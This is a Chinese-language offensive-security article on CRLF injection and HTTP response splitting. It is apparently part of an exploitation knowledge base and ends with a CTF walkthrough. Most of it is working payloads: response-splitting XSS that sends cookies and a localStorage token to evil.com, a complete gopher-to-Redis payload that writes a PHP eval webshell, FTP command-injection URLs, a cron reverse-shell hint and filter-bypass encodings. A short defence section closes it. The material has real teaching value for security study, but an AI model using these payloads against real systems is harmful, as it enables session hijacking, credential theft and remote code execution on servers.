# CRLF 注入与 HTTP 响应拆分

## 一句话理解
CRLF（`\r\n`，即 `%0d%0a`）是 HTTP 协议里"头部行结束"的分隔符。如果用户输入未经处理进入响应头，攻击者就能人为制造换行，拆分响应、注入头部甚至伪造页面内容。

## 核心原理
- HTTP 响应由"状态行 + 响应头 + 空行 + 响应体"组成，头部之间以 `\r\n` 分隔
- 服务端把用户输入写进响应头（如 `Location`、`Set-Cookie`）时未过滤换行符
- 注入 `%0d%0a` 后，攻击者可以终止当前头、新增任意头，甚至插入空行后伪造整个响应体

## 成立条件
- 输入可控且进入 HTTP 响应头（或日志等以换行为分隔的上下文）
- 服务端/中间件未对 `\r`、`\n` 做过滤或编码

## 常见触发点
- 302 跳转：`/redirect?url=http://a.com`，url 写入 `Location` 头
- Cookie 写入：`Set-Cookie: token=<用户输入>`
- 自定义头回显：`X-Forwarded-For`、`X-Request-Id` 的反射
- 文件名写入：`Content-Disposition: filename=<用户输入>`
- 日志记录：输入未过滤直接写日志（日志伪造/注入）

## 完整报文前后对比（以 Location 反射为例）

### 1. 注入前：正常 302 跳转

请求：

```http
GET /redirect?url=https://example.com/ HTTP/1.1
Host: target.com
```

响应（url 原样写入 Location 头，一切正常）：

```http
HTTP/1.1 302 Found
Location: https://example.com/
Content-Type: text/html; charset=utf-8
Content-Length: 0
```

### 2. 注入 Set-Cookie 后：响应头被"拆"出新行

请求（url 中编码注入 `%0d%0aSet-Cookie: session=hijack`）：

```http
GET /redirect?url=https://example.com%0d%0aSet-Cookie:%20session=hijack HTTP/1.1
Host: target.com
```

响应——服务端把 `\r\n` 原样拼进 Location 值，凭空多出一个完整的 Set-Cookie 头：

```http
HTTP/1.1 302 Found
Location: https://example.com
Set-Cookie: session=hijack          ← 注入生效：种植可用于会话固定的 Cookie
Content-Type: text/html; charset=utf-8
Content-Length: 0
```

注入深度决定效果：一个 `%0d%0a` 是"新增任意头"；再补一个 `%0d%0a`（空行）则越过头部区进入"伪造响应体"。

### 3. 响应拆分打 XSS：一次请求、两段响应

请求（注入两个 `%0d%0a`——先结束 Location 头所在行，再补空行终结整个头部区，随后是伪造的响应体）：

```http
GET /redirect?url=https://example.com%0d%0a%0d%0a%3Cscript%3Efetch(%27https%3A%2F%2fevil.com%2Fsteal%3Fc%3D%27%2bdocument.cookie)%3C%2Fscript%3E HTTP/1.1
Host: target.com
```

实际到达浏览器的原始字节流——同一个响应里"藏"着拆分后的两段：

```http
HTTP/1.1 302 Found
Location: https://example.com
Content-Type: text/html; charset=utf-8
Content-Length: 0

<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

- 前 6 行是服务端真正想发的 302 响应
- 注入的空行提前终结了头部区，`<script>...` 被浏览器当作**响应体**渲染执行 → 直接 XSS
- 若注入的是完整状态行（`%0d%0aHTTP/1.1 200 OK...`），伪造的第二段响应会错位给 **keep-alive 连接上的下一个请求**——这正是"响应拆分（Response Splitting）"名字的由来，可进一步配合缓存投毒

## 常见利用形式
### 1. HTTP 响应拆分 -> XSS

```text
/redirect?url=%0d%0a%0d%0a<script>alert(1)</script>
```

注入空行后，后续内容被浏览器当作响应体解析，直接执行脚本。

### 2. 注入响应头

```text
%0d%0aSet-Cookie:%20admin=true
```

可种植 Cookie（配合会话固定）、篡改缓存策略、注入安全头以外的任意头。

### 3. 缓存投毒入口
通过注入的头/响应体污染共享缓存（CDN、反向代理），影响后续所有用户——与 [EXP-Request-Smuggling](./EXP-Request-Smuggling.md) 的缓存投毒思路同源。

### 4. 日志伪造
在日志中注入换行，伪造日志条目掩盖攻击痕迹或栽赃他人（蓝队视角也需注意）。

### 5. 联动 Redis：CRLF 直接下发 RESP 命令写 Webshell

Redis 的 RESP 协议同为明文、以换行为分隔，与 CRLF 注入天然契合。SSRF 场景下借 gopher/HTTP 向 `target:6379` 下发命令（各命令以 `%0d%0a` 分隔），无认证 Redis 可直接落盘 webshell：

```text
# gopher 打 Redis 的完整 payload（URL 编码后的 RESP 指令串）：
# 流程：1) flushall 清脏数据  2) set 写入 webshell（payload 前后补 %0a 防脏数据破坏解析）
#       3) 4) 设置 RDB 备份目录与文件名  5) save 落盘为 shell.php
gopher://target:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$28%0d%0a%0a%3C%3Fphp%20eval%28%24_POST%5Bcmd%5D%29%3B%3F%3E%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

对应明文（Redis 视角收到的指令）：

```text
*1
$8
flushall
*3
$3
set
$1
1
$28

<?php eval($_POST[cmd]);?>

*4
$6
config
$3
set
$3
dir
$13
/var/www/html
*4
$6
config
$3
set
$10
dbfilename
$9
shell.php
*1
$4
save
```

- RESP 语法：`*N` 表示一条命令有 N 个参数，`$N` 表示下一参数的字节数；Redis 对 `\r\n` 与 `\n` 都接受
- 坑点：`$28` 等长度值必须与参数真实字节数一致（`\n` + 26 字节 payload + `\n` = 28）；webshell 前后补空行 `\n`，防止 RDB 头部残留数据破坏 `<?php` 解析
- web 目录不可写时可退而求其次：`config set dir /var/spool/cron` 写 root 计划任务反弹 shell

### 6. 联动 FTP：命令注入与 PASV 注入

FTP 同为明文指令协议，SSRF 中通过 `ftp://` URL 的用户名/路径注入 CRLF 即可下发任意 FTP 命令；历史上还有客户端 PASV 响应处理缺陷的利用思路（如 curl 的 CVE-2019-5482：恶意 FTP 服务器在 PASV 响应中注入数据，诱导 curl 连接任意 IP:端口）——核心思想一句话：**明文协议 + 换行分隔 = CRLF 可注入面**：

```text
# URL userinfo 处注入命令（客户端先发 USER，注入的 HELP 等命令紧随其后）
ftp://anonymous%0d%0aHELP@target.com/

# 路径处注入（登录后对 FTP 连接下发任意指令）
ftp://anonymous@target.com/%0d%0aCWD%20uploads%0d%0aTYPE%20I%0d%0afile.txt
```

## 绕过手法
| 场景 | Payload |
| --- | --- |
| 基础 | `%0d%0a` |
| 过滤了 `%0d%0a` | `%0a`、`%0d` 单用（部分解析器接受） |
| 双重解码 | `%250d%250a` |
| Unicode 编码差异 | `%e5%98%8a%e5%98%8d`（旧 Java 容器把特定 UTF-8 解码成换行，已少见） |

## 快速判断
1. 找所有会进入响应头的参数（跳转、Cookie、文件名）
2. 注入 `%0d%0aX-Test:%20crlf`，看响应里是否出现 `X-Test: crlf` 头
3. 出现即成立，再评估能打 XSS、投毒还是只能自嗨（Self-XSS 危害需论证）

## 与相邻篇目的关系
- 请求走私本质也是"请求边界解析不一致"，见 [EXP-Request-Smuggling](./EXP-Request-Smuggling.md)
- CRLF 打 XSS 时后续利用与 [EXP-XSS](./EXP-XSS.md) 一致

## 案例：一道 CRLF CTF 题完整流程（Location 注入 → 拆分 XSS → 偷 token）

**背景**：`http://chall/redirect?url=<url>` 302 跳转，url 参数写入 `Location` 头；站点有 admin bot 每隔 30s 访问提交的链接，目标是偷 bot 的 token。

**Step 1 触发点定位**：302 的 url 参数进入 `Location` 头 → CRLF 候选。

**Step 2 验证头注入**：

```http
GET /redirect?url=https://a.com%0d%0aX-Pwned:%201 HTTP/1.1
Host: chall
```

响应中出现 `X-Pwned: 1` → 头注入成立。

**Step 3 升级为响应拆分 XSS**：

```http
GET /redirect?url=x%0d%0a%0d%0a%3Cscript%3Efetch(%27http%3A%2F%2fevil.com%2Fx%3Ft%3D%27%2blocalStorage.token)%3C%2Fscript%3E HTTP/1.1
Host: chall
```

注入两个 `%0d%0a` 终结头部区，浏览器把 `<script>` 当响应体渲染，`localStorage.token` 回传 evil.com（先本地自测确认 token 的键名）。

**Step 4 打 admin bot**：把 Step 3 的完整 URL 通过题目接口提交 → bot 访问 → 脚本执行 → evil.com 收到 `?t=<admin_token>`。

**Step 5 收尾**：用偷到的 token 替换自己的凭据访问 `/admin/flag` → 拿到 flag。

**踩坑记录**（此类题共性）：
- 部分中间件只认 `%0a`，`%0d%0a` 反被拦——两种都试
- 注入点若发生在**重定向跟随链**的某一跳上，注意最终执行脚本的域是哪一跳（跨域拿不到目标域的 storage）
- bot 可能禁止外联：外带回传失败时改用 `<img src=x onerror=...>` 等不依赖 fetch 的变体，或先落 XSS 再同域打点

## 防御要点
- 写入响应头前过滤/编码 `\r`、`\n`
- 框架升级：现代框架默认拒绝头中的换行（老 Tomcat、老 PHP 需自行处理）
- 日志统一 JSON 结构化输出，避免换行注入

## 参考
- [OWASP CRLF Injection](https://owasp.org/www-community/vulnerabilities/CRLF_Injection)
- [PortSwigger - Response splitting and smuggling（响应拆分现并入走私系列）](https://portswigger.net/web-security/request-smuggling)
- [PortSwigger - HTTP Request Smuggling 系列首页（含缓存投毒联动）](https://portswigger.net/web-security/request-smuggling)
